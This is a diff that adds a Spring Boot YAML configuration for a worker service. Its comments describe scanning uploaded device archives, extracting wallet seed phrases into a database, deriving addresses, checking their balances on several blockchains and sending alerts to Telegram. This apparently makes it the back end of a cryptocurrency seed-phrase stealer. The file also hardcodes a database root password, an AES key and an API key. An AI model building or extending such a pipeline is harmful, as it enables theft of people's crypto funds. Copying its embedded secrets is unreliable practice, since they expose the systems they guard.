@@ -1,0 +1,153 @@
+server:
+  port: 8602
+  tomcat:
+    threads:
+      max: 50
+      min-spare: 8
+
+spring:
+  application:
+    name: 26-consumer-server
+  cloud:
+    nacos:
+      discovery:
+        server-addr: http://127.0.0.1:8848
+        fail-fast: false
+        namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a
+  mvc:
+    pathmatch:
+      matching-strategy: ant_path_matcher
+  jackson:
+    date-format: yyyy-MM-dd HH:mm:ss
+    time-zone: GMT+8
+  redis:
+    host: 127.0.0.1
+    port: 6379
+    database: 2
+    timeout: 15s
+    lettuce:
+      pool:
+        max-active: 64
+        max-idle: 32
+        min-idle: 8
+        max-wait: 3000ms
+  datasource:
+    driver-class-name: com.mysql.cj.jdbc.Driver
+    url: jdbc:mysql://127.0.0.1:3306/ios_26?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
+    username: root
+    password: Root@123
+    type: com.alibaba.druid.pool.DruidDataSource
+    initialSize: 10
+    minIdle: 10
+    maxActive: 64
+    maxWait: 5000
+    timeBetweenEvictionRunsMillis: 30000
+    minEvictableIdleTimeMillis: 50000
+    validationQuery: SELECT 1
+    testWhileIdle: true
+    testOnBorrow: false
+    testOnReturn: false
+
+mybatis-plus:
+  configuration:
+    map-underscore-to-camel-case: true
+  global-config:
+    db-config:
+      id-type: auto
+
+v26:
+  upload-dir: D:/v26_records/uploads
+  mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey@98kapp"
+  queue:
+    # 扫压缩包、提取助记词入库（不查链）
+    device-parse: queue:device_parse
+    # 派生地址 + 查链余额 + 余额飞机（跟上面不是同一条队列）
+    mnemonic-balance: queue:mnemonic_balance
+    notes-mnemonic: queue:notes_mnemonic
+    tg-message: queue:tg_message
+  consumer:
+    # true=解析和查链拆开；false=解析线程里同步查链（会变慢）
+    defer-balance: true
+    derive-count: 1
+    max-retries: 8
+    blpop-timeout-sec: 2
+    inflight-ttl-sec: 180
+    # --- 各 Redis 队列消费线程
+    parse:
+      threads: 8
+      pollers: 2
+      queue-capacity: 64
+      pop-batch: 8
+    notes:
+      threads: 4
+      pollers: 2
+      queue-capacity: 32
+      pop-batch: 4
+    balance:
+      threads: 16
+      pollers: 2
+      queue-capacity: 64
+      pop-batch: 8
+    telegram:
+      threads: 4
+      pollers: 2
+      queue-capacity: 64
+      pop-batch: 8
+    # 单设备内并行解压扫包
+    scan-pool:
+      core-size: 4
+      max-size: 8
+      queue-capacity: 64
+      keep-alive-seconds: 60
+    # 打链上 RPC 查余额
+    balance-http-pool:
+      core-size: 12
+      max-size: 24
+      queue-capacity: 256
+      keep-alive-seconds: 60
+
+# 查链：NOWNodes 优先，失败降级官方/公共节点（对齐 18 monitor.balance）
+monitor:
+  balance:
+    enabled: true
+    timeout-ms: 8000
+    connect-timeout-ms: 5000
+    pool-size: 24
+    max-concurrent: 10
+    # 主节点失败后再试几个公共节点，避免 4 个降级各卡满 timeout
+    max-fallback-nodes: 1
+    nownodes:
+      enabled: true
+      api-key: "17d3c9a1-2922-422c-b245-40472e4cb30e"
+      eth: https://eth.nownodes.io
+      bsc: https://bsc.nownodes.io
+      sol: https://sol.nownodes.io
+      btc: https://btcbook.nownodes.io
+      tron: https://trx-blockbook.nownodes.io
+    eth-rpc: https://ethereum.publicnode.com,https://1rpc.io/eth,https://cloudflare-eth.com,https://eth.llamarpc.com
+    bsc-rpc: https://bsc-dataseed.binance.org,https://bsc-dataseed1.binance.org,https://bsc.publicnode.com,https://bsc-dataseed2.binance.org
+    tron-api: https://api.trongrid.io
+    btc-api: https://blockstream.info/api,https://mempool.space/api
+    sol-rpc: https://api.mainnet-beta.solana.com,https://solana-rpc.publicnode.com,https://rpc.ankr.com/solana
+    eth-usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
+    bsc-usdt: "0x55d398326f99059fF775485246999027B3197955"
+    tron-usdt: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
+    sol-usdt: Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB
+
+telegram:
+  mornitor_bot_token: ""
+  max-concurrent: 8
+  acquire-timeout-ms: 15000
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health,info
+  endpoint:
+    health:
+      show-details: always
+
+logging:
+  level:
+    com.consumer: INFO
